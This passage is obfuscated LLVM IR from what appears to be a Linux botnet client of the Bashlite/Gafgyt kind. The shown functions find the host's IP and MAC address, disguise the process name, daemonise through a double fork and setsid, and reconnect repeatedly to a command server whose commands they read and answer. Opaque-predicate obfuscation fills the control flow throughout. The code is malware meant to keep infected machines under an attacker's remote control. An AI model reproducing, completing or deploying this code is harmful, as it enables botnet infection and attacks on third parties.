  %25 = load i32, i32* @y.86
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %197

; <label>:32:                                     ; preds = %0
  %33 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %33, i8 0, i64 16, i32 4, i1 false)
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %34, align 4
  %35 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.112, i32 0, i32 0)) #2
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %37 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %36, i32 0, i32 0
  store i32 %35, i32* %37, align 4
  %38 = call zeroext i16 @htons(i16 zeroext 53) #13
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  %40 = load i32, i32* %2, align 4
  %41 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  store i32 %42, i32* %4, align 4
  %43 = load i32, i32* %4, align 4
  %44 = icmp eq i32 %43, -1
  br i1 %44, label %45, label %46

; <label>:45:                                     ; preds = %32
  store i32 0, i32* %1, align 4
  br label %197

; <label>:46:                                     ; preds = %32
  store i32 16, i32* %6, align 4
  %47 = load i32, i32* %2, align 4
  %48 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %49 = call i32 @getsockname(i32 %47, %struct.sockaddr* %48, i32* %6) #2
  store i32 %49, i32* %4, align 4
  %50 = load i32, i32* %4, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %46
  store i32 0, i32* %1, align 4
  br label %197

; <label>:53:                                     ; preds = %46
  %54 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %55 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %54, i32 0, i32 0
  %56 = load i32, i32* %55, align 4
  store i32 %56, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %57 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.113, i32 0, i32 0), i32 0)
  store i32 %57, i32* %7, align 4
  br label %58

; <label>:58:                                     ; preds = %111, %53
  %59 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %60 = load i32, i32* %7, align 4
  %61 = call i8* @fdgets(i8* %59, i32 4096, i32 %60)
  %62 = icmp ne i8* %61, null
  br i1 %62, label %63, label %113

; <label>:63:                                     ; preds = %58
  %64 = load i32, i32* @x.85
  %65 = load i32, i32* @y.86
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %63
  %72 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %73 = call i8* @strstr(i8* %72, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.114, i32 0, i32 0)) #10
  %74 = icmp ne i8* %73, null
  %75 = load i32, i32* @x.85
  %76 = load i32, i32* @y.86
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %74, label %83, label %111

; <label>:83:                                     ; preds = %originalBBpart24
  %84 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %84, i8** %9, align 8
  br label %85

; <label>:85:                                     ; preds = %originalBBpart28, %83
  %86 = load i8*, i8** %9, align 8
  %87 = load i8, i8* %86, align 1
  %88 = zext i8 %87 to i32
  %89 = icmp ne i32 %88, 9
  br i1 %89, label %90, label %109

; <label>:90:                                     ; preds = %85
  %91 = load i32, i32* @x.85
  %92 = load i32, i32* @y.86
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %90
  %99 = load i8*, i8** %9, align 8
  %100 = getelementptr inbounds i8, i8* %99, i32 1
  store i8* %100, i8** %9, align 8
  %101 = load i32, i32* @x.85
  %102 = load i32, i32* @y.86
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %85

; <label>:109:                                    ; preds = %85
  %110 = load i8*, i8** %9, align 8
  store i8 0, i8* %110, align 1
  br label %113

; <label>:111:                                    ; preds = %originalBBpart24
  %112 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %112, i8 0, i64 4096, i32 16, i1 false)
  br label %58

; <label>:113:                                    ; preds = %109, %58
  %114 = load i32, i32* %7, align 4
  %115 = call i32 @close(i32 %114)
  %116 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %117 = load i8, i8* %116, align 16
  %118 = icmp ne i8 %117, 0
  br i1 %118, label %119, label %178

; <label>:119:                                    ; preds = %113
  %120 = load i32, i32* @x.85
  %121 = load i32, i32* @y.86
  %122 = sub i32 %120, 1
  %123 = mul i32 %120, %122
  %124 = urem i32 %123, 2
  %125 = icmp eq i32 %124, 0
  %126 = icmp slt i32 %121, 10
  %127 = or i1 %125, %126
  br i1 %127, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %119
  %128 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %129 = bitcast %union.anon.6* %128 to [16 x i8]*
  %130 = getelementptr inbounds [16 x i8], [16 x i8]* %129, i32 0, i32 0
  %131 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %132 = call i8* @strcpy(i8* %130, i8* %131) #2
  %133 = load i32, i32* %2, align 4
  %134 = call i32 (i32, i64, ...) @ioctl(i32 %133, i64 35111, %struct.ifreq* %11) #2
  store i32 0, i32* %10, align 4
  %135 = load i32, i32* @x.85
  %136 = load i32, i32* @y.86
  %137 = sub i32 %135, 1
  %138 = mul i32 %135, %137
  %139 = urem i32 %138, 2
  %140 = icmp eq i32 %139, 0
  %141 = icmp slt i32 %136, 10
  %142 = or i1 %140, %141
  br i1 %142, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %143

; <label>:143:                                    ; preds = %174, %originalBBpart212
  %144 = load i32, i32* %10, align 4
  %145 = icmp slt i32 %144, 6
  br i1 %145, label %146, label %177

; <label>:146:                                    ; preds = %143
  %147 = load i32, i32* @x.85
  %148 = load i32, i32* @y.86
  %149 = sub i32 %147, 1
  %150 = mul i32 %147, %149
  %151 = urem i32 %150, 2
  %152 = icmp eq i32 %151, 0
  %153 = icmp slt i32 %148, 10
  %154 = or i1 %152, %153
  br i1 %154, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %146
  %155 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %156 = bitcast %union.anon.7* %155 to %struct.sockaddr*
  %157 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %156, i32 0, i32 1
  %158 = getelementptr inbounds [14 x i8], [14 x i8]* %157, i32 0, i32 0
  %159 = load i32, i32* %10, align 4
  %160 = sext i32 %159 to i64
  %161 = getelementptr inbounds i8, i8* %158, i64 %160
  %162 = load i8, i8* %161, align 1
  %163 = load i32, i32* %10, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %164
  store i8 %162, i8* %165, align 1
  %166 = load i32, i32* @x.85
  %167 = load i32, i32* @y.86
  %168 = sub i32 %166, 1
  %169 = mul i32 %166, %168
  %170 = urem i32 %169, 2
  %171 = icmp eq i32 %170, 0
  %172 = icmp slt i32 %167, 10
  %173 = or i1 %171, %172
  br i1 %173, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %174

; <label>:174:                                    ; preds = %originalBBpart216
  %175 = load i32, i32* %10, align 4
  %176 = add nsw i32 %175, 1
  store i32 %176, i32* %10, align 4
  br label %143

; <label>:177:                                    ; preds = %143
  br label %178

; <label>:178:                                    ; preds = %177, %113
  %179 = load i32, i32* @x.85
  %180 = load i32, i32* @y.86
  %181 = sub i32 %179, 1
  %182 = mul i32 %179, %181
  %183 = urem i32 %182, 2
  %184 = icmp eq i32 %183, 0
  %185 = icmp slt i32 %180, 10
  %186 = or i1 %184, %185
  br i1 %186, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %178
  %187 = load i32, i32* %2, align 4
  %188 = call i32 @close(i32 %187)
  %189 = load i32, i32* @x.85
  %190 = load i32, i32* @y.86
  %191 = sub i32 %189, 1
  %192 = mul i32 %189, %191
  %193 = urem i32 %192, 2
  %194 = icmp eq i32 %193, 0
  %195 = icmp slt i32 %190, 10
  %196 = or i1 %194, %195
  br i1 %196, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %197

; <label>:197:                                    ; preds = %originalBBpart220, %52, %45, %originalBBpart2
  %198 = load i32, i32* %1, align 4
  ret i32 %198

originalBBalteredBB:                              ; preds = %originalBB, %15
  store i32 0, i32* %1, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %63
  %199 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %200 = call i8* @strstr(i8* %199, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.114, i32 0, i32 0)) #10
  %201 = icmp ne i8* %200, null
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %90
  %202 = load i8*, i8** %9, align 8
  %203 = getelementptr inbounds i8, i8* %202, i32 1
  store i8* %203, i8** %9, align 8
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %119
  %204 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %205 = bitcast %union.anon.6* %204 to [16 x i8]*
  %206 = getelementptr inbounds [16 x i8], [16 x i8]* %205, i32 0, i32 0
  %207 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %208 = call i8* @strcpy(i8* %206, i8* %207) #2
  %209 = load i32, i32* %2, align 4
  %210 = call i32 (i32, i64, ...) @ioctl(i32 %209, i64 35111, %struct.ifreq* %11) #2
  store i32 0, i32* %10, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %146
  %211 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %212 = bitcast %union.anon.7* %211 to %struct.sockaddr*
  %213 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %212, i32 0, i32 1
  %214 = getelementptr inbounds [14 x i8], [14 x i8]* %213, i32 0, i32 0
  %215 = load i32, i32* %10, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds i8, i8* %214, i64 %216
  %218 = load i8, i8* %217, align 1
  %219 = load i32, i32* %10, align 4
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %220
  store i8 %218, i8* %221, align 1
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %178
  %222 = load i32, i32* %2, align 4
  %223 = call i32 @close(i32 %222)
  br label %originalBB18
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #4

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #4

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.115, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca [1024 x i8], align 16
  %20 = alloca i32, align 4
  %21 = alloca [10 x i8*], align 16
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.116, i32 0, i32 0), i8** %6, align 8
  %25 = call i8* @getBuild()
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.117, i32 0, i32 0), i8* %25)
  %27 = load i8**, i8*** %5, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 0
  %29 = load i8*, i8** %28, align 8
  %30 = load i8**, i8*** %5, align 8
  %31 = getelementptr inbounds i8*, i8** %30, i64 0
  %32 = load i8*, i8** %31, align 8
  %33 = call i64 @strlen(i8* %32) #10
  %34 = call i8* @strncpy(i8* %29, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.116, i32 0, i32 0), i64 %33) #2
  %35 = load i8**, i8*** %5, align 8
  %36 = getelementptr inbounds i8*, i8** %35, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.116, i32 0, i32 0), i8** %36, align 8
  %37 = load i8*, i8** %6, align 8
  %38 = ptrtoint i8* %37 to i64
  %39 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %38, i32 0, i32 0, i32 0)
  %40 = call i64 @time(i64* null) #2
  %41 = call i32 @getpid() #2
  %42 = sext i32 %41 to i64
  %43 = xor i64 %40, %42
  %44 = trunc i64 %43 to i32
  call void @srand(i32 %44) #2
  %45 = call i64 @time(i64* null) #2
  %46 = call i32 @getpid() #2
  %47 = sext i32 %46 to i64
  %48 = xor i64 %45, %47
  %49 = trunc i64 %48 to i32
  call void @init_rand(i32 %49)
  %50 = call i32 @getOurIP()
  %51 = call i32 @fork() #2
  store i32 %51, i32* %7, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %56

; <label>:53:                                     ; preds = %2
  %54 = load i32, i32* %7, align 4
  %55 = call i32 @waitpid(i32 %54, i32* %9, i32 0)
  call void @exit(i32 0) #14
  unreachable

; <label>:56:                                     ; preds = %2
  %57 = load i32, i32* %7, align 4
  %58 = icmp ne i32 %57, 0
  br i1 %58, label %87, label %59

; <label>:59:                                     ; preds = %56
  %60 = call i32 @fork() #2
  store i32 %60, i32* %8, align 4
  %61 = icmp ne i32 %60, 0
  br i1 %61, label %62, label %63

; <label>:62:                                     ; preds = %59
  call void @exit(i32 0) #14
  unreachable

; <label>:63:                                     ; preds = %59
  %64 = load i32, i32* %8, align 4
  %65 = icmp ne i32 %64, 0
  br i1 %65, label %83, label %66

; <label>:66:                                     ; preds = %63
  %67 = load i32, i32* @x.89
  %68 = load i32, i32* @y.90
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %66
  %75 = load i32, i32* @x.89
  %76 = load i32, i32* @y.90
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %85

; <label>:83:                                     ; preds = %63
  %84 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.118, i32 0, i32 0))
  br label %85

; <label>:85:                                     ; preds = %83, %originalBBpart2
  br label %86

; <label>:86:                                     ; preds = %85
  br label %89

; <label>:87:                                     ; preds = %56
  %88 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.118, i32 0, i32 0))
  br label %89

; <label>:89:                                     ; preds = %87, %86
  %90 = load i32, i32* @x.89
  %91 = load i32, i32* @y.90
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %89
  %98 = load i32, i32* @x.89
  %99 = load i32, i32* @y.90
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %106

; <label>:106:                                    ; preds = %originalBBpart24
  %107 = call i32 @setsid() #2
  %108 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.119, i32 0, i32 0)) #2
  %109 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #2
  br label %110

; <label>:110:                                    ; preds = %675, %113, %106
  %111 = call i32 @initConnection()
  %112 = icmp ne i32 %111, 0
  br i1 %112, label %113, label %115

; <label>:113:                                    ; preds = %110
  %114 = call i32 @sleep(i32 5)
  br label %110

; <label>:115:                                    ; preds = %110
  %116 = load i32, i32* @mainCommSock, align 4
  %117 = call i8* @getBuild()
  %118 = call i32 (i32, i8*, ...) @sockprintf(i32 %116, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.120, i32 0, i32 0), i8* %117)
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  br label %119

; <label>:119:                                    ; preds = %674, %548, %390, %320, %115
  %120 = load i32, i32* @mainCommSock, align 4
  %121 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %122 = call i32 @recvLine(i32 %120, i8* %121, i32 4096)
  store i32 %122, i32* %11, align 4
  %123 = icmp ne i32 %122, -1
  br i1 %123, label %124, label %675

; <label>:124:                                    ; preds = %119
  %125 = load i32, i32* @x.89
  %126 = load i32, i32* @y.90
  %127 = sub i32 %125, 1
  %128 = mul i32 %125, %127
  %129 = urem i32 %128, 2
  %130 = icmp eq i32 %129, 0
  %131 = icmp slt i32 %126, 10
  %132 = or i1 %130, %131
  br i1 %132, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %124
  store i32 0, i32* %12, align 4
  %133 = load i32, i32* @x.89
  %134 = load i32, i32* @y.90
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %141

; <label>:141:                                    ; preds = %292, %originalBBpart28
  %142 = load i32, i32* %12, align 4
  %143 = sext i32 %142 to i64
  %144 = load i64, i64* @numpids, align 8
  %145 = icmp ult i64 %143, %144
  br i1 %145, label %146, label %295

; <label>:146:                                    ; preds = %141
  %147 = load i32*, i32** @pids, align 8
  %148 = load i32, i32* %12, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds i32, i32* %147, i64 %149
  %151 = load i32, i32* %150, align 4
  %152 = call i32 @waitpid(i32 %151, i32* null, i32 1)
  %153 = icmp sgt i32 %152, 0
  br i1 %153, label %154, label %275

; <label>:154:                                    ; preds = %146
  %155 = load i32, i32* @x.89
  %156 = load i32, i32* @y.90
  %157 = sub i32 %155, 1
  %158 = mul i32 %155, %157
  %159 = urem i32 %158, 2
  %160 = icmp eq i32 %159, 0
  %161 = icmp slt i32 %156, 10
  %162 = or i1 %160, %161
  br i1 %162, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %154
  %163 = load i32, i32* %12, align 4
  %164 = add nsw i32 %163, 1
  store i32 %164, i32* %14, align 4
  %165 = load i32, i32* @x.89
  %166 = load i32, i32* @y.90
  %167 = sub i32 %165, 1
  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBBpart217, label %originalBB10alteredBB

originalBBpart217:                                ; preds = %originalBB10
  br label %173

; <label>:173:                                    ; preds = %205, %originalBBpart217
  %174 = load i32, i32* @x.89
  %175 = load i32, i32* @y.90
  %176 = sub i32 %174, 1
  %177 = mul i32 %174, %176
  %178 = urem i32 %177, 2
  %179 = icmp eq i32 %178, 0
  %180 = icmp slt i32 %175, 10
  %181 = or i1 %179, %180
  br i1 %181, label %originalBB19, label %originalBB19alteredBB

originalBB19:                                     ; preds = %originalBB19alteredBB, %173
  %182 = load i32, i32* %14, align 4
  %183 = zext i32 %182 to i64
  %184 = load i64, i64* @numpids, align 8
  %185 = icmp ult i64 %183, %184
  %186 = load i32, i32* @x.89
  %187 = load i32, i32* @y.90
  %188 = sub i32 %186, 1
  %189 = mul i32 %186, %188
  %190 = urem i32 %189, 2
  %191 = icmp eq i32 %190, 0
  %192 = icmp slt i32 %187, 10
  %193 = or i1 %191, %192
  br i1 %193, label %originalBBpart221, label %originalBB19alteredBB

originalBBpart221:                                ; preds = %originalBB19
  br i1 %185, label %194, label %208

; <label>:194:                                    ; preds = %originalBBpart221
  %195 = load i32*, i32** @pids, align 8
  %196 = load i32, i32* %14, align 4
  %197 = zext i32 %196 to i64
  %198 = getelementptr inbounds i32, i32* %195, i64 %197
  %199 = load i32, i32* %198, align 4
  %200 = load i32*, i32** @pids, align 8
  %201 = load i32, i32* %14, align 4
  %202 = sub i32 %201, 1
  %203 = zext i32 %202 to i64
  %204 = getelementptr inbounds i32, i32* %200, i64 %203
  store i32 %199, i32* %204, align 4
  br label %205

; <label>:205:                                    ; preds = %194
  %206 = load i32, i32* %14, align 4
  %207 = add i32 %206, 1
  store i32 %207, i32* %14, align 4
  br label %173

; <label>:208:                                    ; preds = %originalBBpart221
  %209 = load i32*, i32** @pids, align 8
  %210 = load i32, i32* %14, align 4
  %211 = sub i32 %210, 1
  %212 = zext i32 %211 to i64
  %213 = getelementptr inbounds i32, i32* %209, i64 %212
  store i32 0, i32* %213, align 4
  %214 = load i64, i64* @numpids, align 8
  %215 = add i64 %214, -1
  store i64 %215, i64* @numpids, align 8
  %216 = load i64, i64* @numpids, align 8
  %217 = add i64 %216, 1
  %218 = mul i64 %217, 4
  %219 = call noalias i8* @malloc(i64 %218) #2
  %220 = bitcast i8* %219 to i32*
  store i32* %220, i32** %13, align 8
  store i32 0, i32* %14, align 4
  br label %221

; <label>:221:                                    ; preds = %originalBBpart233, %208
  %222 = load i32, i32* @x.89
  %223 = load i32, i32* @y.90
  %224 = sub i32 %222, 1
  %225 = mul i32 %222, %224
  %226 = urem i32 %225, 2
  %227 = icmp eq i32 %226, 0
  %228 = icmp slt i32 %223, 10
  %229 = or i1 %227, %228
  br i1 %229, label %originalBB23, label %originalBB23alteredBB

originalBB23:                                     ; preds = %originalBB23alteredBB, %221
  %230 = load i32, i32* %14, align 4
  %231 = zext i32 %230 to i64
  %232 = load i64, i64* @numpids, align 8
  %233 = icmp ult i64 %231, %232
  %234 = load i32, i32* @x.89
  %235 = load i32, i32* @y.90
  %236 = sub i32 %234, 1
  %237 = mul i32 %234, %236
  %238 = urem i32 %237, 2
  %239 = icmp eq i32 %238, 0
  %240 = icmp slt i32 %235, 10
  %241 = or i1 %239, %240
  br i1 %241, label %originalBBpart225, label %originalBB23alteredBB

originalBBpart225:                                ; preds = %originalBB23
  br i1 %233, label %242, label %271

; <label>:242:                                    ; preds = %originalBBpart225
  %243 = load i32*, i32** @pids, align 8
  %244 = load i32, i32* %14, align 4
  %245 = zext i32 %244 to i64
  %246 = getelementptr inbounds i32, i32* %243, i64 %245
  %247 = load i32, i32* %246, align 4
  %248 = load i32*, i32** %13, align 8
  %249 = load i32, i32* %14, align 4
  %250 = zext i32 %249 to i64
  %251 = getelementptr inbounds i32, i32* %248, i64 %250
  store i32 %247, i32* %251, align 4
  br label %252

; <label>:252:                                    ; preds = %242
  %253 = load i32, i32* @x.89
  %254 = load i32, i32* @y.90
  %255 = sub i32 %253, 1
  %256 = mul i32 %253, %255
  %257 = urem i32 %256, 2
  %258 = icmp eq i32 %257, 0
  %259 = icmp slt i32 %254, 10
  %260 = or i1 %258, %259
  br i1 %260, label %originalBB27, label %originalBB27alteredBB

originalBB27:                                     ; preds = %originalBB27alteredBB, %252
  %261 = load i32, i32* %14, align 4
  %262 = add i32 %261, 1
  store i32 %262, i32* %14, align 4
  %263 = load i32, i32* @x.89
  %264 = load i32, i32* @y.90
  %265 = sub i32 %263, 1
  %266 = mul i32 %263, %265
  %267 = urem i32 %266, 2
  %268 = icmp eq i32 %267, 0
  %269 = icmp slt i32 %264, 10
  %270 = or i1 %268, %269
  br i1 %270, label %originalBBpart233, label %originalBB27alteredBB

originalBBpart233:                                ; preds = %originalBB27
  br label %221

; <label>:271:                                    ; preds = %originalBBpart225
  %272 = load i32*, i32** @pids, align 8
  %273 = bitcast i32* %272 to i8*
  call void @free(i8* %273) #2
  %274 = load i32*, i32** %13, align 8
  store i32* %274, i32** @pids, align 8
  br label %275

; <label>:275:                                    ; preds = %271, %146
  %276 = load i32, i32* @x.89
  %277 = load i32, i32* @y.90
  %278 = sub i32 %276, 1
  %279 = mul i32 %276, %278
  %280 = urem i32 %279, 2
  %281 = icmp eq i32 %280, 0
  %282 = icmp slt i32 %277, 10
  %283 = or i1 %281, %282
  br i1 %283, label %originalBB35, label %originalBB35alteredBB

originalBB35:                                     ; preds = %originalBB35alteredBB, %275
  %284 = load i32, i32* @x.89
  %285 = load i32, i32* @y.90
  %286 = sub i32 %284, 1
  %287 = mul i32 %284, %286
  %288 = urem i32 %287, 2
  %289 = icmp eq i32 %288, 0
  %290 = icmp slt i32 %285, 10
  %291 = or i1 %289, %290
  br i1 %291, label %originalBBpart237, label %originalBB35alteredBB

originalBBpart237:                                ; preds = %originalBB35
  br label %292

; <label>:292:                                    ; preds = %originalBBpart237
  %293 = load i32, i32* %12, align 4
  %294 = add nsw i32 %293, 1
  store i32 %294, i32* %12, align 4
  br label %141

; <label>:295:                                    ; preds = %141
  %296 = load i32, i32* @x.89
  %297 = load i32, i32* @y.90
  %298 = sub i32 %296, 1
  %299 = mul i32 %296, %298
  %300 = urem i32 %299, 2
  %301 = icmp eq i32 %300, 0
  %302 = icmp slt i32 %297, 10
  %303 = or i1 %301, %302
  br i1 %303, label %originalBB39, label %originalBB39alteredBB

originalBB39:                                     ; preds = %originalBB39alteredBB, %295
  %304 = load i32, i32* %11, align 4
  %305 = sext i32 %304 to i64
  %306 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %305
  store i8 0, i8* %306, align 1
  %307 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @trim(i8* %307)
  %308 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %309 = call i8* @strstr(i8* %308, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.44, i32 0, i32 0)) #10
  %310 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %311 = icmp eq i8* %309, %310
  %312 = load i32, i32* @x.89
  %313 = load i32, i32* @y.90
  %314 = sub i32 %312, 1
  %315 = mul i32 %312, %314
  %316 = urem i32 %315, 2
  %317 = icmp eq i32 %316, 0
  %318 = icmp slt i32 %313, 10
  %319 = or i1 %317, %318
  br i1 %319, label %originalBBpart241, label %originalBB39alteredBB

originalBBpart241:                                ; preds = %originalBB39
  br i1 %311, label %320, label %323

; <label>:320:                                    ; preds = %originalBBpart241
  %321 = load i32, i32* @mainCommSock, align 4
  %322 = call i32 (i32, i8*, ...) @sockprintf(i32 %321, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.121, i32 0, i32 0))
  br label %119

; <label>:323:                                    ; preds = %originalBBpart241
